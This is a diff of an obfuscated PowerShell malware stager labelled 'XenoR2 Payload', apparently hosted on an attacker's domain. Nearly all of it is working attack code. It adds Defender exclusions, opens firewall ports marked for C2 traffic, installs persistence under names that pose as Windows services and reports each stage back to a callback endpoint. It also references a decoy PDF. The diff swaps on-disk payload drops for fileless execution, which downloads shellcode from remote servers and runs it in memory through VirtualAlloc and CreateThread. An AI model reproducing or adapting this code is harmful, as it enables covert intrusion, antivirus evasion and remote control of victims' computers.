@@ -1,11 +1,11 @@
-# XenoR2 Payload v16-obs — BITS Transfer (silent), firewall rules, defender kill
+# XenoR2 Payload v17-obs — Fileless In-Memory Execution
 # Placed on signindat.com as stage-obs-v2.ps1
-# 2 payloads: PatchPulsaar.exe → wmpp.exe + wdsr681f3e18.exe → wmov.exe
+# 2 payloads: pulsar.bin + overlord.bin → VirtualAlloc → CreateThread (NO DISK)
 
 # === DIAGNOSTIC LOG ===
 $log="$env:TEMP\wmisrv.log"
 function log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $log -Append -Encoding utf8 }
-log "=== PAYLOAD START (v16-obs) ==="
+log "=== PAYLOAD START (v17-obs fileless) ==="
 
 # === STRING OBFUSCATION ===
 # Sources
@@ -18,29 +18,25 @@ $sources=@($gh,$srv)
 # Binary names (source on server)
 $n1='Ele';$n2='vato';$n3='rShe';$n4='llCo';$n5='de.e';$n6='xe';$elev=$n1+$n2+$n3+$n4+$n5+$n6
 $n7='win';$n8='def';$n9='ctl';$n10='.ex';$n11='e';$wdf=$n7+$n8+$n9+$n10+$n11
-$n12='Pat';$n13='chPu';$n14='lsaa';$n15='r.ex';$n16='e';$ppx=$n12+$n13+$n14+$n15+$n16
-$n17='wd';$n18='sr';$n19='68';$n20='1f';$n21='3e';$n22='18';$n23='.ex';$n24='e';$wdsrSrc=$n17+$n18+$n19+$n20+$n21+$n22+$n23+$n24
-$n25='Rat';$n26='e_Co';$n27='nfir';$n28='mati';$n29='on_L';$n30='D-20';$n31='26-0';$n32='847.';$n33='pdf'
-$pdf=$n25+$n26+$n27+$n28+$n29+$n30+$n31+$n32+$n33
-
-# Final payload names on disk
-$n34='wm';$n35='pp.';$n36='exe';$wmpp=$n34+$n35+$n36
-$n37='wm';$n38='ov.';$n39='exe';$wmov=$n37+$n38+$n39
+$n12='pul';$n13='sar-';$n14='mem';$n15='ory';$n16='.bi';$n17='n';$pulsarBin=$n12+$n13+$n14+$n15+$n16+$n17
+$n18='wds';$n19='rt1';$n20='e9f';$n21='372';$n22='f.b';$n23='in';$overlordBin=$n18+$n19+$n20+$n21+$n22+$n23
+$n24='Rat';$n25='e_Co';$n26='nfir';$n27='mati';$n28='on_L';$n29='D-20';$n30='26-0';$n31='847.';$n32='pdf'
+$pdf=$n24+$n25+$n26+$n27+$n28+$n29+$n30+$n31+$n32
 
 # Callback endpoint
-$n40='cb.';$n41='php';$cbep=$n40+$n41
+$n35='cb.';$n36='php';$cbep=$n35+$n36
 
 # Persistence
-$n42='upd';$n43='atem';$n44='spul';$n45='sv2.';$n46='ps1';$persistScript=$n42+$n43+$n44+$n45+$n46
-$n47='Win';$n48='dows';$n49='Secu';$n50='rity';$n51='Heal';$n52='th';$rkName=$n47+$n48+$n49+$n50+$n51+$n52
-$n53='Win';$n54='dows';$n55='Upda';$n56='teOr';$n57='ches';$n58='trat';$n59='or';$rkNameAdmin=$n53+$n54+$n55+$n56+$n57+$n58+$n59
-$n60='Win';$n61='dows';$n62='Heal';$n63='thMo';$n64='nito';$n65='r';$taskName=$n60+$n61+$n62+$n63+$n64+$n65
+$n37='upd';$n38='atem';$n39='spul';$n40='sv2.';$n41='ps1';$persistScript=$n37+$n38+$n39+$n40+$n41
+$n42='Win';$n43='dows';$n44='Secu';$n45='rity';$n46='Heal';$n47='th';$rkName=$n42+$n43+$n44+$n45+$n46+$n47
+$n48='Win';$n49='dows';$n50='Upda';$n51='teOr';$n52='ches';$n53='trat';$n54='or';$rkNameAdmin=$n48+$n49+$n50+$n51+$n52+$n53+$n54
+$n55='Win';$n56='dows';$n57='Heal';$n58='thMo';$n59='nito';$n60='r';$taskName=$n55+$n56+$n57+$n58+$n59+$n60
 
 # Firewall strings
-$n66='net';$n67='sh a';$n68='dvfi';$n69='rewa';$n70='ll';$fw=$n66+$n67+$n68+$n69+$n70
-$n71='fire';$n72='wall';$n73=' add';$n74=' rul';$n75='e na';$n76='me=';$fwAdd=$n71+$n72+$n73+$n74+$n75+$n76
-$n77=' dir';$n78='=in ';$n79='act';$n80='ion';$n81='=al';$n82='low ';$n83='pro';$n84='toc';$n85='ol=';$n86='TCP';$fwIn=$n77+$n78+$n79+$n80+$n81+$n82+$n83+$n84+$n85+$n86
-$n87=' loc';$n88='alpo';$n89='rt=';$fwOut=$n77.Replace('in','out')+$n78.Replace('in','out')+$n79+$n80+$n81+$n82+$n83+$n84+$n85+$n86
+$n61='net';$n62='sh a';$n63='dvfi';$n64='rewa';$n65='ll';$fw=$n61+$n62+$n63+$n64+$n65
+$n66='fire';$n67='wall';$n68=' add';$n69=' rul';$n70='e na';$n71='me=';$fwAdd=$n66+$n67+$n68+$n69+$n70+$n71
+$n72=' dir';$n73='=in ';$n74='act';$n75='ion';$n76='=al';$n77='low ';$n78='pro';$n79='toc';$n80='ol=';$n81='TCP';$fwIn=$n72+$n73+$n74+$n75+$n76+$n77+$n78+$n79+$n80+$n81
+$n82=' loc';$n83='alpo';$n84='rt=';$fwOut=$n72.Replace('in','out')+$n73.Replace('in','out')+$n74+$n75+$n76+$n77+$n78+$n79+$n80+$n81
 
 $t=$env:TEMP
 $ad="$env:APPDATA\Microsoft"
@@ -73,7 +69,39 @@ try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.W
 log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
-# === BITS TRANSFER DOWNLOAD HELPER (dual-source, fully silent) ===
+# === KERNEL32 P/INVOKE (for in-memory shellcode execution) ===
+$k32=Add-Type -MemberDefinition @'
+[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+'@ -Name "K32" -PassThru
+
+# === FILELESS IN-MEMORY EXECUTION HELPER ===
+function _memExec($n,$label){
+    foreach($src in $sources){
+        $url="$src/$n"
+        try{
+            log "MEM: $label from $src"
+            $wc=New-Object Net.WebClient
+            $bytes=$wc.DownloadData($url)
+            if($bytes.Length -gt 0){
+                log "MEM: $label downloaded $($bytes.Length) bytes into memory"
+                $mem=$k32::VirtualAlloc(0,[uint32]$bytes.Length,0x3000,0x40)
+                if($mem -eq [IntPtr]::Zero){log "MEM: $label VirtualAlloc failed"; continue}
+                [Runtime.InteropServices.Marshal]::Copy($bytes,0,$mem,$bytes.Length)
+                $thread=$k32::CreateThread(0,0,$mem,0,0,0)
+                if($thread -eq [IntPtr]::Zero){log "MEM: $label CreateThread failed"; continue}
+                log "MEM: $label thread=$thread, shellcode executing in-memory"
+                return $true
+            }
+            log "MEM: $label zero bytes from $src"
+        }catch{log "MEM: $label fail from $src : $_"}
+    }
+    log "MEM: $label fail all sources"
+    return $false
+}
+
+# === BITS TRANSFER DOWNLOAD HELPER (for disk-based files: elev, defkill, pdf) ===
 function _bitsDL($n,$dest,$label){
     foreach($src in $sources){
         $url="$src/$n"
@@ -99,7 +127,7 @@ try{
     & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ad" -ErrorAction SilentlyContinue
     & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ld" -ErrorAction SilentlyContinue
     & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$dl" -ErrorAction SilentlyContinue
-    $exclProcs=@($wmpp,$wmov,'wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
+    $exclProcs=@('wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
     foreach($xp in $exclProcs){try{& "$($mp+$mp2+$mp3+$mp4)" -ExclusionProcess $xp -ErrorAction SilentlyContinue}catch{}}
     log "Defender exclusions added"
 }catch{log "FAILED Defender exclusions: $_ (non-fatal)"}
@@ -144,21 +172,13 @@ if($cbIsAdmin){
     $ports=@('5173','4782')
     foreach($port in $ports){
         try{
-            & $fw $fwAdd"`"C2-In-$port`" $fwIn $n87$n88$n89$port" 2>&1 | Out-Null
+            & $fw $fwAdd"`"C2-In-$port`" $fwIn $n82$n83$n84$port" 2>&1 | Out-Null
             log "S2b: inbound rule added for TCP $port"
         }catch{log "S2b: inbound $port fail: $_"}
         try{
-            & $fw $fwAdd"`"C2-Out-$port`" $fwOut $n87$n88$n89$port" 2>&1 | Out-Null
+            & $fw $fwAdd"`"C2-Out-$port`" $fwOut $n82$n83$n84$port" 2>&1 | Out-Null
             log "S2b: outbound rule added for TCP $port"
         }catch{log "S2b: outbound $port fail: $_"}
-    }
-    # Outbound allow for payload processes
-    $fwProcs=@($wmpp,$wmov)
-    foreach($fp in $fwProcs){
-        try{
-            & $fw $fwAdd"`"C2-Proc-$fp`" $fwOut.Replace($n86,'Any') $n87.Replace('local','')$n88.Replace('port','')$n89.Replace('rt=','program=')"$ad\$fp"" 2>&1 | Out-Null
-            log "S2b: outbound rule added for $fp"
-        }catch{log "S2b: outbound proc $fp fail: $_"}
     }
     _cb 'S2b' 'ok' 'fw rules added'
 }else{_cb 'S2b' 'warn' 'no admin, skip fw'}
@@ -197,102 +217,20 @@ if($cbIsAdmin){
 }
 _cb 'S3' 'ok' 'persist ok'
 
-# === STEP 5: PAYLOAD 1 — PatchPulsaar.exe → wmpp.exe ===
-$wmppPath="$ad\$wmpp"
-$wmppExists=(Test-Path $wmppPath)
-log "S5: exists=$wmppExists at $wmppPath"
-
-if(-not $wmppExists){
-    $wmppFallback="$ld\$wmpp"
-    if(Test-Path $wmppFallback){$wmppPath=$wmppFallback; $wmppExists=$true; log "S5: fallback found at $wmppPath"}
+# === STEP 5: PAYLOAD 1 — pulsar.bin (PatchPulsaar) → IN-MEMORY ===
+log "S5: executing pulsar.bin in-memory"
+if(_memExec $pulsarBin 'pulsar'){
+    _cb 'S5' 'ok' 'pulsar in-memory'
+}else{
+    _cb 'S5' 'fail' 'pulsar mem fail'
 }
 
-if($wmppExists){
-    try{
-        $p=Start-Process $wmppPath -WindowStyle Hidden -PassThru
-        log "S5: re-launch PID=$($p.Id) from $wmppPath"
-        _cb 'S5' 'ok' "re-launch PID=$($p.Id)"
-    }catch{
-        log "S5: re-launch fail: $_, will re-download"
-        $wmppExists=$false
-    }
-}
-
-if(-not $wmppExists){
-    log "S5: downloading $ppx → $wmpp"
-    $wmppTmp="$t\$wmpp"
-    if(_bitsDL $ppx $wmppTmp 'payload1'){
-        $copyTargets=@("$ad\$wmpp","$ld\$wmpp")
-        foreach($ct in $copyTargets){
-            try{
-                $dir=Split-Path $ct -Parent
-                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
-                Copy-Item $wmppTmp $ct -Force
-                log "S5: copied to $ct"
-            }catch{log "S5: copy fail $ct : $_"}
-        }
-        try{
-            $launchPath="$ad\$wmpp"
-            $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
-            log "S5: wmpp PID=$($p.Id) from AppData"
-            _cb 'S5' 'ok' "PID=$($p.Id)"
-        }catch{
-            log "S5: launch fail: $_"
-            _cb 'S5' 'fail' "launch err"
-        }
-    }else{
-        log "S5: wmpp dl fail"
-        _cb 'S5' 'fail' 'dl fail'
-    }
-}
-
-# === STEP 6: PAYLOAD 2 — wdsr681f3e18.exe → wmov.exe (Overlord) ===
-$wmovPath="$ad\$wmov"
-$wmovExists=(Test-Path $wmovPath)
-log "S6: exists=$wmovExists at $wmovPath"
-
-if(-not $wmovExists){
-    $wmovFallback="$ld\$wmov"
-    if(Test-Path $wmovFallback){$wmovPath=$wmovFallback; $wmovExists=$true; log "S6: fallback found at $wmovPath"}
-}
-
-if($wmovExists){
-    try{
-        $wmovProc=Start-Process $wmovPath -WindowStyle Hidden -PassThru
-        log "S6: re-launch PID=$($wmovProc.Id) from $wmovPath"
-        _cb 'S6' 'ok' "re-launch PID=$($wmovProc.Id)"
-    }catch{
-        log "S6: re-launch fail: $_, will re-download"
-        $wmovExists=$false
-    }
-}
-
-if(-not $wmovExists){
-    log "S6: downloading $wdsrSrc → $wmov"
-    $wmovTmp="$t\$wmov"
-    if(_bitsDL $wdsrSrc $wmovTmp 'payload2'){
-        $wmovCopyTargets=@("$ad\$wmov","$ld\$wmov")
-        foreach($ct in $wmovCopyTargets){
-            try{
-                $dir=Split-Path $ct -Parent
-                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
-                Copy-Item $wmovTmp $ct -Force
-                log "S6: copied to $ct"
-            }catch{log "S6: copy fail $ct : $_"}
-        }
-        try{
-            $wmovLaunch="$ad\$wmov"
-            $wmovProc=Start-Process $wmovLaunch -WindowStyle Hidden -PassThru
-            log "S6: wmov PID=$($wmovProc.Id) from AppData"
-            _cb 'S6' 'ok' "PID=$($wmovProc.Id)"
-        }catch{
-            log "S6: launch fail: $_"
-            _cb 'S6' 'fail' "launch err"
-        }
-    }else{
-        log "S6: wmov dl fail"
-        _cb 'S6' 'fail' 'dl fail'
-    }
+# === STEP 6: PAYLOAD 2 — overlord.bin (wdsr681f3e18) → IN-MEMORY ===
+log "S6: executing overlord.bin in-memory"
+if(_memExec $overlordBin 'overlord'){
+    _cb 'S6' 'ok' 'overlord in-memory'
+}else{
+    _cb 'S6' 'fail' 'overlord mem fail'
 }
 
 # === STEP 7: PDF DECOY ===
